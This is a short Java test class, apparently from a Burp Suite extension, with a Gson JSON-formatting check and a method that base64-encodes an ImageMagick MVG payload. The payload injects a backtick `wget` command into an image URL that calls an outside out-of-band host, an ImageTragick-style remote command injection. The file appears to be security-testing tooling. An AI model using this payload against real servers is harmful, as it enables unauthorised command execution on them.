package test;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;

import java.util.Base64;

//import org.apache.commons.lang.StringEscapeUtils;
import org.apache.commons.text.StringEscapeUtils;

import burp.Getter;

public class gsoTest {
	public static void main(String args[]) {
		test1();
	}
	
	public void test() {
		String chineseCharacter = "\\uff01\\u0040\\u0023\\uffe5\\u0025\\u2026\\u2026\\u0026\\u002a\\uff08\\uff09\\u2014\\u2014\\u002d\\u003d\\uff0c\\u3002\\uff1b\\uff1a\\u201c\\u2018\\u007b\\u007d\\u3010\\u3011\\u002b";
		String chineseCharacter1 = "\\uff01\\u0040\\u0023\\uffe5\\u0025";
		String test = String.format("{\"a\":\"%s\"}",chineseCharacter);
		System.out.println(test);
		Gson gson = new GsonBuilder().setPrettyPrinting().disableHtmlEscaping().serializeNulls().create();
         //Get only the JSON part of the content
         JsonParser jp = new JsonParser();
         JsonElement je = jp.parse(test);
         String xxx = gson.toJson(je);
         System.out.println( gson.toJson(je));
         
         System.out.println(StringEscapeUtils.unescapeJava(chineseCharacter));
	}
	
	public static void test1() {
		String payload ="push graphic-context\r\n" + 
				"viewbox 0 0 640 480\r\n" + 
				"image over 0,0 0,0 'https://imagemagic.bit.0y0.link/x.php?x=`wget -O- %s > /dev/null`'\r\n" + 
				"pop graphic-context";
		
		String a = new String(Base64.getEncoder().encode(payload.getBytes()));
		System.out.println(a);
	}
}
